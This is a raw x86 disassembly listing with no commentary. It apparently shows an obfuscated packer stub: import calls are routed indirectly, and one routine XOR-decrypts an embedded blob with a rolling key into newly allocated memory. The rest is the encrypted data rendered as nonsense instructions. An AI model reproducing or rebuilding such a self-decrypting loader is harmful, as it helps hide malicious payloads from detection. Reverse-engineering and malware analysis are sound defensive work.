  401996:	ret    
  401997:	add    BYTE PTR [ebx-0x1374aa01],cl
  40199d:	sub    esp,0x38
  4019a0:	push   edx
  4019a1:	push   0x40302c
  4019a6:	pop    eax
  4019a7:	call   DWORD PTR cs:[eax]
  4019aa:	pop    edx
  4019ab:	push   edx
  4019ac:	push   DWORD PTR [edx+0x47c]
  4019b2:	push   esi
  4019b3:	push   DWORD PTR [edx+0x4c4]
  4019b9:	call   0x401b34
  4019be:	add    esp,0xc
  4019c1:	pop    edx
  4019c2:	push   edx
  4019c3:	mov    edx,0x0
  4019c8:	push   edx
  4019c9:	push   0x40307c
  4019ce:	pop    eax
  4019cf:	call   DWORD PTR cs:[eax]
  4019d2:	pop    edx
  4019d3:	sub    esp,0xffffffc8
  4019d6:	mov    ebp,DWORD PTR [esp]
  4019d9:	add    esp,0x4
  4019dc:	ret    
  4019dd:	add    BYTE PTR [eax],al
  4019df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4019e5:	sub    esp,0x20
  4019e8:	push   edx
  4019e9:	mov    ecx,0x0
  4019ee:	push   ecx
  4019ef:	push   0x403014
  4019f4:	pop    eax
  4019f5:	call   DWORD PTR cs:[eax]
  4019f8:	pop    edx
  4019f9:	push   edx
  4019fa:	push   ebx
  4019fb:	push   esi
  4019fc:	push   ebx
  4019fd:	call   0x401e2c
  401a02:	add    esp,0xc
  401a05:	pop    edx
  401a06:	push   edx
  401a07:	mov    ecx,0x0
  401a0c:	push   ecx
  401a0d:	push   0x403010
  401a12:	pop    eax
  401a13:	call   DWORD PTR cs:[eax]
  401a16:	pop    edx
  401a17:	sub    esp,0xffffffe0
  401a1a:	mov    ebp,DWORD PTR [esp]
  401a1d:	add    esp,0x4
  401a20:	ret    
  401a21:	add    BYTE PTR [eax],al
  401a23:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a29:	sub    esp,0x20
  401a2c:	push   edx
  401a2d:	push   DWORD PTR [edx+0x2e8]
  401a33:	push   edi
  401a34:	push   DWORD PTR [edx+0x4a8]
  401a3a:	push   ebx
  401a3b:	call   0x401b78
  401a40:	add    esp,0x10
  401a43:	pop    edx
  401a44:	push   edx
  401a45:	push   0x0
  401a47:	push   0x403044
  401a4c:	pop    eax
  401a4d:	call   DWORD PTR cs:[eax]
  401a50:	pop    edx
  401a51:	push   edx
  401a52:	push   0x0
  401a54:	push   0x40306c
  401a59:	pop    eax
  401a5a:	call   DWORD PTR cs:[eax]
  401a5d:	pop    edx
  401a5e:	sub    esp,0xffffffe0
  401a61:	mov    ebp,DWORD PTR [esp]
  401a64:	add    esp,0x4
  401a67:	ret    
  401a68:	mov    edi,edi
  401a6a:	push   ebp
  401a6b:	mov    ebp,esp
  401a6d:	sub    esp,0x20
  401a70:	push   edx
  401a71:	push   ecx
  401a72:	push   DWORD PTR [edx+0x5b8]
  401a78:	push   ecx
  401a79:	push   esi
  401a7a:	call   0x40127c
  401a7f:	add    esp,0x10
  401a82:	pop    edx
  401a83:	push   edx
  401a84:	mov    edx,0x0
  401a89:	push   edx
  401a8a:	push   0x403044
  401a8f:	pop    eax
  401a90:	call   DWORD PTR cs:[eax]
  401a93:	pop    edx
  401a94:	push   edx
  401a95:	mov    ecx,0x0
  401a9a:	push   ecx
  401a9b:	push   0x40303c
  401aa0:	pop    eax
  401aa1:	call   DWORD PTR cs:[eax]
  401aa4:	pop    edx
  401aa5:	sub    esp,0xffffffe0
  401aa8:	mov    ebp,DWORD PTR [esp]
  401aab:	add    esp,0x4
  401aae:	ret    
  401aaf:	add    BYTE PTR [ebx-0x1374aa01],cl
  401ab5:	sub    esp,0x3c
  401ab8:	push   edx
  401ab9:	mov    ecx,0x0
  401abe:	push   ecx
  401abf:	push   0x403044
  401ac4:	pop    eax
  401ac5:	call   DWORD PTR cs:[eax]
  401ac8:	pop    edx
  401ac9:	push   edx
  401aca:	push   ebx
  401acb:	push   DWORD PTR [edx+0x3a8]
  401ad1:	push   edi
  401ad2:	call   0x40140c
  401ad7:	add    esp,0xc
  401ada:	pop    edx
  401adb:	push   edx
  401adc:	push   0x403030
  401ae1:	pop    eax
  401ae2:	call   DWORD PTR cs:[eax]
  401ae5:	pop    edx
  401ae6:	sub    esp,0xffffffc4
  401ae9:	mov    ebp,DWORD PTR [esp]
  401aec:	add    esp,0x4
  401aef:	ret    
	...
  401af8:	mov    edi,edi
  401afa:	push   ebp
  401afb:	mov    ebp,esp
  401afd:	sub    esp,0x5c
  401b00:	push   edx
  401b01:	push   0x40302c
  401b06:	pop    eax
  401b07:	call   DWORD PTR cs:[eax]
  401b0a:	pop    edx
  401b0b:	push   edx
  401b0c:	push   eax
  401b0d:	push   DWORD PTR [edx+0x68]
  401b10:	call   0x401388
  401b15:	add    esp,0x8
  401b18:	pop    edx
  401b19:	push   edx
  401b1a:	mov    ebx,0x0
  401b1f:	push   ebx
  401b20:	push   0x403004
  401b25:	pop    eax
  401b26:	call   DWORD PTR cs:[eax]
  401b29:	pop    edx
  401b2a:	sub    esp,0xffffffa4
  401b2d:	mov    ebp,DWORD PTR [esp]
  401b30:	add    esp,0x4
  401b33:	ret    
  401b34:	mov    edi,edi
  401b36:	push   ebp
  401b37:	mov    ebp,esp
  401b39:	sub    esp,0x44
  401b3c:	push   edx
  401b3d:	push   DWORD PTR [edx+0x59c]
  401b43:	push   DWORD PTR [edx+0x410]
  401b49:	push   esi
  401b4a:	push   eax
  401b4b:	call   0x40167c
  401b50:	add    esp,0x10
  401b53:	pop    edx
  401b54:	push   edx
  401b55:	push   0x0
  401b57:	push   0x403020
  401b5c:	pop    eax
  401b5d:	call   DWORD PTR cs:[eax]
  401b60:	pop    edx
  401b61:	push   edx
  401b62:	push   0x0
  401b64:	push   0x403020
  401b69:	pop    eax
  401b6a:	call   DWORD PTR cs:[eax]
  401b6d:	pop    edx
  401b6e:	sub    esp,0xffffffbc
  401b71:	mov    ebp,DWORD PTR [esp]
  401b74:	add    esp,0x4
  401b77:	ret    
  401b78:	mov    edi,edi
  401b7a:	push   ebp
  401b7b:	mov    ebp,esp
  401b7d:	sub    esp,0x54
  401b80:	push   edx
  401b81:	mov    eax,0x0
  401b86:	push   eax
  401b87:	push   0x40306c
  401b8c:	pop    eax
  401b8d:	call   DWORD PTR cs:[eax]
  401b90:	pop    edx
  401b91:	push   edx
  401b92:	push   DWORD PTR [edx+0x234]
  401b98:	push   DWORD PTR [edx+0x4e0]
  401b9e:	push   DWORD PTR [edx+0x120]
  401ba4:	call   0x401954
  401ba9:	add    esp,0xc
  401bac:	pop    edx
  401bad:	push   edx
  401bae:	mov    edx,0x0
  401bb3:	push   edx
  401bb4:	push   0x40306c
  401bb9:	pop    eax
  401bba:	call   DWORD PTR cs:[eax]
  401bbd:	pop    edx
  401bbe:	sub    esp,0xffffffac
  401bc1:	mov    ebp,DWORD PTR [esp]
  401bc4:	add    esp,0x4
  401bc7:	ret    
	...
  401bd0:	mov    edi,edi
  401bd2:	push   ebp
  401bd3:	mov    ebp,esp
  401bd5:	sub    esp,0x38
  401bd8:	push   edx
  401bd9:	mov    edx,0x0
  401bde:	push   edx
  401bdf:	push   0x40306c
  401be4:	pop    eax
  401be5:	call   DWORD PTR cs:[eax]
  401be8:	pop    edx
  401be9:	push   edx
  401bea:	push   eax
  401beb:	push   edi
  401bec:	call   0x4011dc
  401bf1:	add    esp,0x8
  401bf4:	pop    edx
  401bf5:	push   edx
  401bf6:	mov    edi,0x0
  401bfb:	push   edi
  401bfc:	push   0x403038
  401c01:	pop    eax
  401c02:	call   DWORD PTR cs:[eax]
  401c05:	pop    edx
  401c06:	sub    esp,0xffffffc8
  401c09:	mov    ebp,DWORD PTR [esp]
  401c0c:	add    esp,0x4
  401c0f:	ret    
  401c10:	mov    edi,edi
  401c12:	push   ebp
  401c13:	mov    ebp,esp
  401c15:	sub    esp,0x2c
  401c18:	push   edx
  401c19:	mov    ecx,0x6b0
  401c1e:	push   ecx
  401c1f:	mov    eax,0x6b0
  401c24:	push   eax
  401c25:	mov    edx,0x40000
  401c2a:	push   edx
  401c2b:	push   0x403008
  401c30:	pop    esi
  401c31:	push   DWORD PTR [esi]
  401c33:	sub    DWORD PTR [esp],0x2
  401c37:	push   0x40301c
  401c3c:	pop    esi
  401c3d:	pop    DWORD PTR [esi]
  401c3f:	push   0x40301c
  401c44:	pop    eax
  401c45:	call   DWORD PTR cs:[eax]
  401c48:	xchg   DWORD PTR [esp],eax
  401c4b:	mov    edx,eax
  401c4d:	pop    ecx
  401c4e:	mov    DWORD PTR [edx+0x130],ecx
  401c54:	mov    eax,DWORD PTR [edx+0x130]
  401c5a:	mov    ecx,eax
  401c5c:	sub    eax,eax
  401c5e:	dec    eax
  401c5f:	and    eax,0x401ee1
  401c64:	mov    ebx,DWORD PTR [eax]
  401c66:	mov    DWORD PTR [ecx],ebx
  401c68:	add    eax,0x3
  401c6b:	add    ecx,0x3
  401c6e:	mov    ebx,0x6a719112
  401c73:	push   0x6b0
  401c78:	pop    esi
  401c79:	test   esi,esi
  401c7b:	je     0x401c99
  401c7d:	add    esi,0xfffffffc
  401c80:	mov    edi,ebx
  401c82:	xor    edi,DWORD PTR [eax]
  401c84:	sub    edi,0x1
  401c87:	mov    DWORD PTR [ecx],edi
  401c89:	push   DWORD PTR [ecx]
  401c8b:	mov    ebx,0xfffffffc
  401c90:	sub    eax,ebx
  401c92:	sub    ecx,ebx
  401c94:	pop    ebx
  401c95:	bswap  ebx
  401c97:	jmp    0x401c79
  401c99:	push   edx
  401c9a:	push   0x0
  401c9c:	push   0x403060
  401ca1:	pop    eax
  401ca2:	call   DWORD PTR cs:[eax]
  401ca5:	pop    edx
  401ca6:	sub    esp,0xffffffd4
  401ca9:	pop    ebp
  401caa:	ret    
	...
  401cc3:	add    BYTE PTR [ebx-0x1374aa01],cl
  401cc9:	sub    esp,0x40
  401ccc:	push   edx
  401ccd:	push   eax
  401cce:	push   edi
  401ccf:	call   0x401544
  401cd4:	add    esp,0x8
  401cd7:	pop    edx
  401cd8:	push   edx
  401cd9:	push   0x0
  401cdb:	push   0x403044
  401ce0:	pop    eax
  401ce1:	call   DWORD PTR cs:[eax]
  401ce4:	pop    edx
  401ce5:	push   edx
  401ce6:	mov    edi,0x0
  401ceb:	push   edi
  401cec:	push   0x40303c
  401cf1:	pop    eax
  401cf2:	call   DWORD PTR cs:[eax]
  401cf5:	pop    edx
  401cf6:	sub    esp,0xffffffc0
  401cf9:	mov    ebp,DWORD PTR [esp]
  401cfc:	add    esp,0x4
  401cff:	ret    
  401d00:	mov    edi,edi
  401d02:	push   ebp
  401d03:	mov    ebp,esp
  401d05:	sub    esp,0x60
  401d08:	push   edx
  401d09:	push   DWORD PTR [edx+0x264]
  401d0f:	push   edi
  401d10:	push   edi
  401d11:	call   0x4018bc
  401d16:	add    esp,0xc
  401d19:	pop    edx
  401d1a:	push   edx
  401d1b:	push   0x0
  401d1d:	push   0x40303c
  401d22:	pop    eax
  401d23:	call   DWORD PTR cs:[eax]
  401d26:	pop    edx
  401d27:	push   edx
  401d28:	mov    esi,0x0
  401d2d:	push   esi
  401d2e:	push   0x403010
  401d33:	pop    eax
  401d34:	call   DWORD PTR cs:[eax]
  401d37:	pop    edx
  401d38:	sub    esp,0xffffffa0
  401d3b:	mov    ebp,DWORD PTR [esp]
  401d3e:	add    esp,0x4
  401d41:	ret    
  401d42:	add    BYTE PTR [eax],al
  401d44:	add    BYTE PTR [eax],al
  401d46:	add    BYTE PTR [eax],al
  401d48:	mov    edi,edi
  401d4a:	push   ebp
  401d4b:	mov    ebp,esp
  401d4d:	sub    esp,0x3c
  401d50:	push   edx
  401d51:	push   ebx
  401d52:	push   ecx
  401d53:	push   DWORD PTR [edx+0x1cc]
  401d59:	push   eax
  401d5a:	call   0x401140
  401d5f:	add    esp,0x10
  401d62:	pop    edx
  401d63:	push   edx
  401d64:	push   0x0
  401d66:	push   0x403044
  401d6b:	pop    eax
  401d6c:	call   DWORD PTR cs:[eax]
  401d6f:	pop    edx
  401d70:	push   edx
  401d71:	lea    eax,[edx]
  401d73:	push   eax
  401d74:	push   0x403048
  401d79:	pop    eax
  401d7a:	call   DWORD PTR cs:[eax]
  401d7d:	test   eax,eax
  401d7f:	jne    0x401d71
  401d81:	pop    edx
  401d82:	sub    esp,0xffffffc4
  401d85:	mov    ebp,DWORD PTR [esp]
  401d88:	add    esp,0x4
  401d8b:	ret    
	...
  401d98:	mov    edi,edi
  401d9a:	push   ebp
  401d9b:	mov    ebp,esp
  401d9d:	sub    esp,0x38
  401da0:	push   edx
  401da1:	push   edi
  401da2:	push   DWORD PTR [edx+0x3b4]
  401da8:	push   esi
  401da9:	call   0x401870
  401dae:	add    esp,0xc
  401db1:	pop    edx
  401db2:	push   edx
  401db3:	mov    eax,0x0
  401db8:	push   eax
  401db9:	push   0x403038
  401dbe:	pop    eax
  401dbf:	call   DWORD PTR cs:[eax]
  401dc2:	pop    edx
  401dc3:	push   edx
  401dc4:	mov    esi,0x0
  401dc9:	push   esi
  401dca:	push   0x40306c
  401dcf:	pop    eax
  401dd0:	call   DWORD PTR cs:[eax]
  401dd3:	pop    edx
  401dd4:	sub    esp,0xffffffc8
  401dd7:	mov    ebp,DWORD PTR [esp]
  401dda:	add    esp,0x4
  401ddd:	ret    
  401dde:	add    BYTE PTR [eax],al
  401de0:	add    BYTE PTR [eax],al
  401de2:	add    BYTE PTR [eax],al
  401de4:	mov    edi,edi
  401de6:	push   ebp
  401de7:	mov    ebp,esp
  401de9:	sub    esp,0x34
  401dec:	push   edx
  401ded:	push   ebx
  401dee:	push   DWORD PTR [edx+0x460]
  401df4:	push   DWORD PTR [edx+0x278]
  401dfa:	push   edi
  401dfb:	call   0x401464
  401e00:	add    esp,0x10
  401e03:	pop    edx
  401e04:	push   edx
  401e05:	push   0x403030
  401e0a:	pop    eax
  401e0b:	call   DWORD PTR cs:[eax]
  401e0e:	pop    edx
  401e0f:	push   edx
  401e10:	push   0x0
  401e12:	push   0x403044
  401e17:	pop    eax
  401e18:	call   DWORD PTR cs:[eax]
  401e1b:	pop    edx
  401e1c:	sub    esp,0xffffffcc
  401e1f:	mov    ebp,DWORD PTR [esp]
  401e22:	add    esp,0x4
  401e25:	ret    
  401e26:	add    BYTE PTR [eax],al
  401e28:	add    BYTE PTR [eax],al
  401e2a:	add    BYTE PTR [eax],al
  401e2c:	mov    edi,edi
  401e2e:	push   ebp
  401e2f:	mov    ebp,esp
  401e31:	sub    esp,0x1c
  401e34:	push   edx
  401e35:	push   DWORD PTR [edx+0x1d0]
  401e3b:	push   ecx
  401e3c:	push   DWORD PTR [edx+0x2dc]
  401e42:	push   DWORD PTR [edx+0xe0]
  401e48:	call   0x401710
  401e4d:	add    esp,0x10
  401e50:	pop    edx
  401e51:	push   edx
  401e52:	mov    eax,0x0
  401e57:	push   eax
  401e58:	push   0x403004
  401e5d:	pop    eax
  401e5e:	call   DWORD PTR cs:[eax]
  401e61:	pop    edx
  401e62:	push   edx
  401e63:	push   0x0
  401e65:	push   0x403044
  401e6a:	pop    eax
  401e6b:	call   DWORD PTR cs:[eax]
  401e6e:	pop    edx
  401e6f:	sub    esp,0xffffffe4
  401e72:	mov    ebp,DWORD PTR [esp]
  401e75:	add    esp,0x4
  401e78:	ret    
  401e79:	add    BYTE PTR [eax],al
  401e7b:	add    BYTE PTR [eax],al
  401e7d:	add    BYTE PTR [eax],al
  401e7f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e85:	sub    esp,0x34
  401e88:	push   edx
  401e89:	mov    edi,0x0
  401e8e:	push   edi
  401e8f:	push   0x40303c
  401e94:	pop    eax
  401e95:	call   DWORD PTR cs:[eax]
  401e98:	pop    edx
  401e99:	push   edx
  401e9a:	push   DWORD PTR [edx+0xac]
  401ea0:	push   eax
  401ea1:	call   0x401830
  401ea6:	add    esp,0x8
  401ea9:	pop    edx
  401eaa:	push   edx
  401eab:	lea    eax,[edx]
  401ead:	push   eax
  401eae:	push   0x403048
  401eb3:	pop    eax
  401eb4:	call   DWORD PTR cs:[eax]
  401eb7:	test   eax,eax
  401eb9:	jne    0x401eab
  401ebb:	pop    edx
  401ebc:	sub    esp,0xffffffcc
  401ebf:	mov    ebp,DWORD PTR [esp]
  401ec2:	add    esp,0x4
  401ec5:	ret    
  401ec6:	add    BYTE PTR [eax],al
  401ec8:	mov    dh,BYTE PTR [edx+0x7f46c226]
  401ece:	mov    edi,DWORD PTR [esi-0x5ec925ee]
  401ed4:	mov    dl,ah
  401ed6:	lods   eax,DWORD PTR ds:[esi]
  401ed7:	and    BYTE PTR [esp+edx*2],dl
  401eda:	mov    ch,0x29
  401edc:	mov    esi,ebp
  401ede:	and    edx,DWORD PTR [edi+eiz*1-0x100237f1]
  401ee5:	sahf   
  401ee6:	mov    ecx,0xc7c70097
  401eeb:	add    DWORD PTR [eax],eax
  401eed:	mov    edi,0xc6e30001
  401ef3:	jg     0x401f36
  401ef5:	retf   0xa27e
  401ef8:	mov    ebp,0x310580a8
  401efd:	imul   esi,eax,0xffffffe2
  401f00:	add    DWORD PTR ds:0x251691a3,ecx
  401f06:	gs ins BYTE PTR es:[edi],dx
  401f08:	pop    eax
  401f09:	push   edi
  401f0a:	inc    eax
  401f0b:	push   ss
  401f0c:	or     DWORD PTR [edx+0x32],eax
  401f0f:	imul   ecx,DWORD PTR [ecx],0xffffffff
  401f12:	mov    edx,0xbcd552e7
  401f17:	ins    BYTE PTR es:[edi],dx
  401f18:	mov    esi,0x81d8533b
  401f1d:	push   esp
  401f1e:	js     0x401f17
  401f20:	pop    edx
  401f21:	call   0xf444a516
  401f26:	mov    ch,0xa0
  401f28:	jge    0x401f0e
  401f2a:	adc    BYTE PTR [eax],al
  401f2c:	add    DWORD PTR [eax],edx
  401f2e:	adc    al,0x1d
  401f30:	sbb    ebp,DWORD PTR [edi+0x468a0000]
  401f36:	(bad)  
  401f37:	adc    BYTE PTR [esi+edx*4],dl
  401f3a:	and    eax,0x60f2ae1
  401f3f:	call   0x3110:0x20092406
  401f46:	sbb    edx,DWORD PTR [edi+0x76dd5ba9]
  401f4c:	ins    DWORD PTR es:[edi],dx
  401f4d:	mov    DWORD PTR [eax+0x13],esp
  401f50:	xor    eax,0x2102650d
  401f55:	add    BYTE PTR [edx+eax*1],al
  401f58:	and    eax,0x5c1d9a32
  401f5d:	jbe    0x401f74
  401f5f:	push   eax
  401f60:	add    BYTE PTR [edx+0x702b6291],0xc4
  401f67:	xchg   ebx,eax
  401f68:	adc    DWORD PTR [eax],eax
  401f6a:	add    al,ah
  401f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f6d:	push   0xff6b6a00
  401f72:	push   ebp
  401f73:	push   ss
  401f74:	pushf  
  401f75:	lods   eax,DWORD PTR ds:[esi]
  401f76:	cli    
  401f77:	cdq    
  401f78:	cwde   
  401f79:	add    eax,0xb5dedbf8
  401f7e:	aam    0xf9
  401f80:	stc    
  401f81:	aam    0xf
  401f83:	sub    eax,0xcffb9a7
  401f88:	push   esi
  401f89:	ret    
  401f8a:	call   0xc428ad1c
  401f8f:	stc    
  401f90:	add    al,BYTE PTR [edi-0x238cdecc]
  401f96:	jl     0x401ff2
  401f98:	add    eax,0x3f6f00fb
  401f9d:	call   0x6ab2aaa2
  401fa2:	add    BYTE PTR [edi+0x6b],ch
  401fa5:	call   FWORD PTR [edi]
  401fa7:	pushf  
  401fa8:	cmp    al,0x8a
  401faa:	stos   BYTE PTR es:[edi],al
  401fab:	sub    BYTE PTR [eax+ebx*1+0x3c6b3d97],ah
  401fb2:	adc    eax,0x47cca74
  401fb7:	push   ecx
  401fb8:	push   es
  401fb9:	pop    es
  401fba:	(bad)  [ecx+0x78]
  401fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fbe:	add    BYTE PTR [ecx-0x364fb057],ch
  401fc4:	loope  0x401fae
  401fc6:	sbb    dh,bl
  401fc8:	int3   
  401fc9:	cmp    al,0x8d
  401fcb:	pop    es
  401fcc:	add    ebp,ebx
  401fce:	retf   
  401fcf:	push   es
  401fd0:	push   edi
  401fd1:	test   DWORD PTR [esi+0x73],0x22581962
  401fd8:	inc    ecx
  401fd9:	dec    ecx
  401fda:	mov    dl,0x4e
  401fdc:	ins    DWORD PTR es:[edi],dx
  401fdd:	loope  0x401ff4
  401fdf:	sbb    al,0x69
  401fe1:	xor    al,0x6a
  401fe3:	xor    al,0x0
  401fe5:	jno    0x402047
  401fe7:	push   ebx
  401fe8:	push   ebx
  401fe9:	push   es
  401fea:	pusha  
  401feb:	je     0x401fe2
  401fed:	jl     0x401ff4
  401fef:	stos   DWORD PTR es:[edi],eax
  401ff0:	aas    
  401ff1:	push   esp
  401ff2:	cmp    ebp,DWORD PTR [esi]
  401ff4:	push   ebx
  401ff5:	add    DWORD PTR [eax],ecx
  401ff7:	ds aas 
  401ff9:	push   cs
  401ffa:	add    ch,BYTE PTR [esp+eax*1+0x77e1cddc]
  402001:	cmp    al,0x2f
  402003:	or     BYTE PTR [esi-0xe],bl
  402006:	jmp    DWORD PTR [ebx-0x49a93d2c]
  40200c:	je     0x401f9c
  40200e:	mov    bh,0x93
  402010:	xchg   esp,eax
  402011:	lods   eax,DWORD PTR cs:[esi]
  402013:	xor    esi,DWORD PTR [edi-0x577bc9f]
  402019:	sbb    esi,esi
  40201b:	dec    BYTE PTR [esi-0x29]
  40201e:	test   BYTE PTR [edi+0x72a00e52],bh
  402024:	ss dec ebx
  402026:	ret    0x8e1c
  402029:	xchg   edi,edi
  40202b:	jnp    0x402000
  40202d:	out    0xc4,eax
  40202f:	test   DWORD PTR [ecx],eax
  402031:	(bad)  
  402032:	pop    ebx
  402033:	arpl   bx,ax
  402035:	in     al,dx
  402036:	arpl   WORD PTR [ebp+0x76],si
  402039:	call   0x14bb6462
  40203e:	push   DWORD PTR [ebp+0x66]
  402041:	je     0x4020ae
  402043:	jnp    0x40204d
  402045:	test   al,dl
  402047:	inc    eax
  402048:	fmul   QWORD PTR [edi+0x50253a9]
  40204e:	test   ecx,ebx
  402050:	cmp    DWORD PTR [ebp+0x6],edx
  402053:	push   es
  402054:	push   edi
  402055:	pop    es
  402056:	or     BYTE PTR [ebx],dh
  402058:	ins    DWORD PTR es:[edi],dx
  402059:	int3   
  40205a:	add    cl,BYTE PTR [eax+ebx*2]
  40205d:	or     BYTE PTR [ebx-0x8],cl
  402060:	aas    
  402061:	das    
  402062:	mov    al,ds:0xc5a758ff
  402067:	jo     0x4020b4
  402069:	dec    ecx
  40206a:	mov    edx,0x29e958bd
  40206f:	mov    DWORD PTR [ecx],0x1e88ae9
  402075:	xor    DWORD PTR [eax+0x186968],0x28760000
  40207f:	push   esi
  402080:	ficom  DWORD PTR [ebx-0x78e6f002]
  402086:	dec    DWORD PTR [ebx-0x220c9fff]
  40208c:	add    al,0xff
  40208e:	add    BYTE PTR fs:[ecx-0x75],bl
  402092:	inc    eax
  402093:	cmp    al,0x80
  402095:	add    BYTE PTR [edi+0x34146061],al
  40209b:	(bad)
  40209f:	scas   eax,DWORD PTR es:[edi]
  4020a0:	jnp    0x402089
  4020a2:	and    al,0x88
  4020a4:	dec    ecx
  4020a5:	sbb    BYTE PTR [edi-0x3477a706],al
  4020ab:	shl    al,0xef
  4020ae:	mov    bl,BYTE PTR [eax+0x6d]
  4020b1:	out    dx,eax
  4020b2:	out    dx,eax
  4020b3:	cmp    DWORD PTR [esi-0x9],edx
  4020b6:	inc    esi
  4020b7:	imul   edi,DWORD PTR [eax+0x44],0xa1190ea1
  4020be:	fs xchg edx,ecx
  4020c1:	xor    BYTE PTR [ecx+0x65767178],cl
  4020c7:	push   esp
  4020c8:	std    
  4020c9:	jbe    0x4020c8
  4020cb:	or     BYTE PTR [ecx],al
  4020cd:	pop    edi
  4020ce:	jmp    0x7e1c:0x79bdd2b0
  4020d5:	je     0x402073
  4020d7:	mov    dh,0x3a
  4020d9:	call   0x791a5a2e
  4020de:	pop    eax
  4020df:	add    al,0x3
  4020e1:	pop    eax
  4020e2:	js     0x4020d8
  4020e4:	mov    eax,DWORD PTR gs:[esi+eiz*1]
  4020e8:	in     al,dx
  4020e9:	add    BYTE PTR [edi+0x424010f],ch
  4020ef:	cmp    BYTE PTR [edx+0x64500424],cl
  4020f5:	(bad)  
  4020f6:	out    0x14,eax
  4020f8:	in     al,dx
  4020f9:	xor    bl,al
  4020fb:	inc    ebp
  4020fc:	dec    ebx
  4020fd:	mov    BYTE PTR [ebp+0xb],al
  402100:	xor    DWORD PTR [esi+0x7472b98b],0xf8f70373
  40210a:	or     bh,dl
  40210c:	mov    al,BYTE PTR [ecx-0x70916601]
  402112:	test   al,0x7a
  402114:	test   eax,0xb6c37e53
  402119:	adc    DWORD PTR [ebx-0x56],0x235457a9
  402120:	fisub  DWORD PTR [esi]
  402122:	adc    BYTE PTR [esi-0x9],dl
  402125:	fwait
  402126:	mov    BYTE PTR [esi],ah
  402128:	sub    edi,DWORD PTR [esi]
  40212a:	dec    BYTE PTR [eax]
  40212c:	xlat   BYTE PTR ds:[ebx]
  40212d:	or     BYTE PTR [ebx+0x4b],0x91
  402131:	fisub  DWORD PTR [edi+0x543f7f]
  402137:	or     DWORD PTR [edi+0x7],edx
  40213a:	or     BYTE PTR [edx+ebx*8],bh
  40213d:	or     dl,al
  40213f:	aas    
  402140:	push   ecx
  402141:	adc    eax,0x657cd8d
  402146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402147:	xchg   ebx,eax
  402148:	pop    ebx
  402149:	cdq    
  40214a:	or     al,dl
  40214c:	mov    ch,0x9e
  40214e:	add    al,0x57
  402150:	add    DWORD PTR [ecx+0xd70019b],ebp
  402156:	inc    esp
  402157:	add    eax,DWORD PTR [eax]
  402159:	popa   
  40215a:	jb     0x402157
  40215c:	(bad)  
  40215d:	jg     0x4021d4
  40215f:	std    
  402160:	mov    dh,BYTE PTR [ebx+ebp*2+0x0]
  402164:	test   eax,0xa9f8f1c
  402169:	hlt    
  40216a:	push   esi
  40216b:	or     eax,0xb10f0a02
  402170:	or     DWORD PTR [edi-0x29aaaaff],ebp
  402176:	cmp    DWORD PTR [ebx-0x8],eax
  402179:	dec    ecx
  40217a:	loop   0x402117
  40217c:	mov    ds:0x78605cea,al
  402181:	sar    ch,1
  402183:	pop    esp
  402184:	adc    BYTE PTR [eax],ah
  402186:	aaa    
  402187:	ja     0x4021df
  402189:	cmp    edx,edx
  40218b:	mov    esi,0x590f8494
  402190:	add    al,0xa4
  402192:	add    BYTE PTR [eax],al
  402194:	add    DWORD PTR [ebx-0x495ed1ee],ecx
  40219a:	mov    eax,DWORD PTR [ebp-0x7e7bf08e]
  4021a0:	add    BYTE PTR [edi+ecx*1-0x7452080b],0xf8
  4021a8:	cld    
  4021a9:	jo     0x4021a8
  4021ab:	js     0x4021fb
  4021ad:	add    BYTE PTR [edx+0x543b0351],ch
  4021b3:	lods   al,BYTE PTR ds:[esi]
  4021b4:	imul   edx,DWORD PTR [edx+ebp*2],0xf8835850
  4021bb:	add    al,0x55
  4021bd:	add    BYTE PTR [edi+0x6a14693f],0x50
  4021c4:	pop    eax
  4021c5:	adc    DWORD PTR [esp],0x57811425
  4021cc:	add    BYTE PTR [esi+0x1c],dl
  4021cf:	jmp    FWORD PTR [ecx-0x859f100]
  4021d5:	jno    0x40219b
  4021d7:	add    al,0xdd
  4021d9:	add    dl,bh
  4021db:	inc    esp
  4021dc:	ins    DWORD PTR es:[edi],dx
  4021dd:	cmp    ah,cl
  4021df:	mov    eax,0xe54462f2
  4021e4:	int3   
  4021e5:	lods   eax,DWORD PTR ds:[esi]
  4021e6:	push   esi
  4021e7:	mov    ah,0x7d
  4021e9:	adc    eax,0xff0ea6ff
  4021ee:	and    al,0x1c
  4021f0:	sbb    al,0xe3
  4021f2:	out    dx,al
  4021f3:	pop    ecx
  4021f4:	xlat   BYTE PTR ds:[ebx]
  4021f5:	stos   BYTE PTR es:[edi],al
  4021f6:	mov    BYTE PTR [ebx],0x56
  4021f9:	jbe    0x40220f
  4021fb:	jb     0x4021cb
  4021fd:	cmp    BYTE PTR [edx+0x41],dl
  402200:	adc    DWORD PTR [eax],eax
  402202:	aas    
  402203:	mov    bl,0x6a
  402205:	push   ebx
  402206:	push   eax
  402207:	dec    esi
  402209:	cmp    BYTE PTR [eax+edi*8],al
  40220c:	adc    DWORD PTR [eax],eax
  40220e:	aas    
  40220f:	mov    cl,0x84
  402211:	jae    0x402213
  402213:	adc    BYTE PTR [ecx],dl
  402215:	add    bl,bl
  402217:	push   ecx
  402218:	pop    eax
  402219:	add    BYTE PTR [ebp+0xc],dl
  40221c:	push   edi
  40221d:	or     al,0xa7
  40221f:	push   esp
  402220:	ficom  WORD PTR [ecx-0x491c24d4]
  402226:	test   eax,0x21cde36e
  40222b:	pushf  
  40222c:	jae    0x402204
  40222e:	scas   al,BYTE PTR es:[edi]
  40222f:	les    ecx,FWORD PTR [edi-0x15]
  402232:	mov    edi,0xe89b497e
  402237:	mov    eax,DWORD PTR [ecx]
  402239:	call   0xec3f6939
  40223e:	push   edx
  40223f:	pop    ds
  402240:	push   ds
  402241:	mov    ecx,0xff0a17ff
  402246:	(bad)  
  402247:	jmp    FWORD PTR [eax+0x1e1f846]
  40224d:	pop    es
  40224e:	push   ecx
  40224f:	adc    dh,0xe8
  402252:	add    BYTE PTR [edx+ebx*2-0x6124348c],cl
  402259:	cmp    eax,0xe801d08b
  40225e:	into   
  40225f:	inc    esi
  402260:	inc    edi
  402262:	fs (bad) 
  402264:	jb     0x4022a7
  402266:	pop    ss
  402267:	inc    ecx
  402268:	mov    esi,0xf2bfcae8
  40226d:	scas   eax,DWORD PTR es:[edi]
  40226e:	ds aaa 
